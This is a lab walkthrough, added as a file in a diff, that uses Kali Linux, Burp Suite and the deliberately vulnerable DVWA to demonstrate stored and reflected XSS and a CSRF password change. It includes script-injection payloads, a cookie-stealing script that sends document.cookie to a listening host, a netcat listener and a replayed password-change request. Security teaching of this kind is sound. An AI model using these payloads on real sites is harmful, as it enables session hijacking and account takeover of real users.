@@ -1,1 +1,325 @@
-asdfasdfsaf
+asdfasdfsafWe use:
+•	Kali Linux → Attacker machine 
+•	Metasploitable2 → Victim vulnerable server 
+•	Burp Suite → Intercepting and analyzing HTTP traffic 
+•	DVWA → Vulnerable web application for testing 
+________________________________________
+PART 1 — Initial Lab Setup
+________________________________________
+Step 1: Start the Virtual Machines
+What to do
+Start both virtual machines:
+•	Kali Linux VM 
+•	Metasploitable2 VM 
+Where to do
+In:
+•	VMware Workstation / VirtualBox 
+Explanation
+•	Kali Linux acts as the attacker/testing machine. 
+•	Metasploitable2 hosts the intentionally vulnerable web application. 
+________________________________________
+Step 2: Verify Network Connectivity
+What to do
+Open terminal in Kali Linux and ping Metasploitable2.
+ping 192.168.45.136
+Where to do
+Kali Linux terminal.
+Explanation
+This checks whether both VMs are connected and can communicate.
+If replies are received:
+64 bytes from 192.168.45.136
+then connectivity is successful.
+________________________________________
+Step 3: Open DVWA Web Application
+What to do
+Open browser in Kali Linux and enter:
+http://192.168.45.136
+Click:
+•	DVWA 
+Login credentials:
+Username: admin
+Password: password
+Where to do
+Firefox browser inside Kali Linux.
+Explanation
+DVWA is intentionally vulnerable and allows us to safely practice attacks.
+________________________________________
+Step 4: Set DVWA Security Level
+What to do
+Navigate to:
+DVWA Security
+Set:
+Security Level = Low
+Click:
+Submit
+Explanation
+Low security disables protections so vulnerabilities become easy to demonstrate.
+________________________________________
+PART 2 — Configuring Burp Suite
+________________________________________
+Step 5: Launch Burp Suite
+What to do
+Open Burp Suite.
+Where to do
+Applications Menu in Kali Linux:
+Applications → Web Application Analysis → Burp Suite
+Explanation
+Burp Suite acts as a proxy between browser and server, allowing us to intercept and analyze requests.
+________________________________________
+Step 6: Configure Browser Proxy
+What to do
+Configure Firefox proxy settings.
+Go to:
+Firefox → Settings → Network Settings → Manual Proxy Configuration
+Set:
+HTTP Proxy: 127.0.0.1
+Port: 8080
+Enable:
+Use this proxy server for all protocols
+Click:
+OK
+Explanation
+Now all browser traffic passes through Burp Suite.
+________________________________________
+Step 7: Import Burp Suite Certificate
+What to do
+In browser, open:
+http://burpsuite
+Download:
+CA Certificate
+Import certificate in Firefox:
+Settings → Privacy & Security → Certificates → View Certificates → Import
+Enable:
+Trust this CA to identify websites
+Explanation
+This prevents HTTPS certificate warnings while intercepting secure traffic.
+________________________________________
+PART 3 — XSS (Cross Site Scripting)
+________________________________________
+What is XSS?
+XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.
+Purpose of attack:
+•	Session hijacking 
+•	Cookie theft 
+•	Redirecting users 
+•	Running malicious scripts 
+Types:
+1.	Stored XSS 
+2.	Reflected XSS 
+________________________________________
+A) Stored XSS
+________________________________________
+Step 8: Navigate to Stored XSS Page
+What to do
+In DVWA sidebar click:
+XSS (Stored)
+Explanation
+Stored XSS permanently stores malicious scripts in database/server.
+Whenever another user visits the page, the script executes automatically.
+________________________________________
+Step 9: Inject Basic HTML
+What to do
+Enter:
+Name: Test
+Message: <b>Hello Everyone</b>
+Click:
+Sign Guestbook
+Explanation
+The <b> tag makes text bold.
+This confirms the application accepts HTML input without sanitization.
+________________________________________
+Step 10: Inject JavaScript Alert
+What to do
+Enter:
+<script>alert("Hello This is XSS")</script>
+Click:
+Sign Guestbook
+Explanation
+The browser executes JavaScript because input is not sanitized.
+Popup appears:
+Hello This is XSS
+This confirms Stored XSS vulnerability exists.
+________________________________________
+Step 11: Verify Persistence
+What to do
+•	Move to another DVWA page. 
+•	Return to XSS Stored page. 
+Explanation
+The popup appears again because the malicious script is permanently stored.
+This is why it is called:
+Stored XSS
+________________________________________
+Step 12: Display Cookies
+What to do
+Inject:
+<script>alert(document.cookie)</script>
+Explanation
+document.cookie displays browser cookies.
+Cookies often contain:
+•	Session IDs 
+•	Authentication tokens 
+Example:
+PHPSESSID=abcd1234
+Attackers can steal sessions using this.
+________________________________________
+B) Reflected XSS
+________________________________________
+Step 13: Navigate to Reflected XSS
+What to do
+Click:
+XSS (Reflected)
+________________________________________
+Step 14: Inject Script
+What to do
+Enter:
+<script>alert("hello")</script>
+Click:
+Submit
+Explanation
+The application reflects user input directly into webpage response.
+Popup appears temporarily.
+________________________________________
+Step 15: Understand Reflected XSS
+Explanation
+If you leave page and come back:
+•	Popup disappears. 
+Why?
+Because script is NOT stored in database.
+It only exists in the current request/response cycle.
+________________________________________
+Step 16: Stealing User Cookies
+________________________________________
+What to do
+Navigate back to:
+XSS (Stored)
+Increase textbox size if needed.
+Insert:
+<script>
+new Image().src="http://192.168.45.136/abc.php?output="+document.cookie;
+</script>
+Click:
+Sign Guestbook
+________________________________________
+Explanation
+This script:
+1.	Creates invisible image request 
+2.	Sends victim cookie to attacker server 
+3.	Cookie becomes part of URL 
+Example:
+abc.php?output=PHPSESSID=xyz123
+This demonstrates:
+Session Hijacking
+________________________________________
+Step 17: Start Listener in Kali Linux
+What to do
+Open terminal and run:
+nc -lvnp 80
+Explanation
+Netcat listener waits for incoming requests containing stolen cookies.
+________________________________________
+Step 18: Trigger the Attack
+What to do
+•	Open another DVWA page 
+•	Return to XSS Stored page 
+Explanation
+The malicious script executes automatically.
+Listener receives:
+GET /abc.php?output=PHPSESSID=xyz123
+Cookie is successfully stolen.
+________________________________________
+PART 4 — CSRF (Cross Site Request Forgery)
+________________________________________
+What is CSRF?
+CSRF tricks authenticated users into performing actions unknowingly.
+Example:
+•	Changing password 
+•	Making payments 
+•	Updating profile 
+The server trusts the user session automatically.
+________________________________________
+Step 19: Navigate to CSRF Page
+What to do
+In DVWA sidebar click:
+CSRF
+________________________________________
+Step 20: Enter New Password
+What to do
+Enter:
+New Password: test123
+Confirm Password: test123
+DO NOT click Change yet.
+________________________________________
+Step 21: Enable Burp Intercept
+What to do
+In Burp Suite:
+Proxy → Intercept
+Click:
+Intercept is ON
+Explanation
+Burp will now capture browser requests before they reach server.
+________________________________________
+Step 22: Submit Password Change
+What to do
+Click:
+Change
+Explanation
+Request gets intercepted by Burp Suite.
+You can now inspect:
+•	Headers 
+•	Cookies 
+•	Parameters 
+•	Session data 
+________________________________________
+Step 23: Send Request to Repeater
+What to do
+Right-click intercepted request.
+Select:
+Send to Repeater
+Explanation
+Repeater allows manual modification and replaying of requests.
+________________________________________
+Step 24: Forward Original Request
+What to do
+Click:
+Forward
+Explanation
+The password changes successfully.
+DVWA shows:
+Password Changed
+________________________________________
+Step 25: Modify Request in Repeater
+What to do
+Go to:
+Repeater Tab
+Modify password parameter:
+Example:
+password_new=hacked123
+Click:
+Send
+________________________________________
+Step 26: Observe Response
+What to do
+Check:
+Response → Render
+Explanation
+Burp Suite displays:
+Password Changed
+This proves attackers can replay requests and manipulate authenticated actions.
+________________________________________
+Step 27: Disable Proxy Intercept
+What to do
+In Burp:
+Proxy → Intercept OFF
+Also disable Firefox proxy settings.
+Explanation
+Restores normal browsing.
+________________________________________
+Step 28: Logout and Test Login
+What to do
+Logout from DVWA.
+Try logging in with:
+•	Old password 
+•	New password 
+Explanation
+Old password fails because attacker changed password through forged request.
+This demonstrates successful CSRF exploitation.
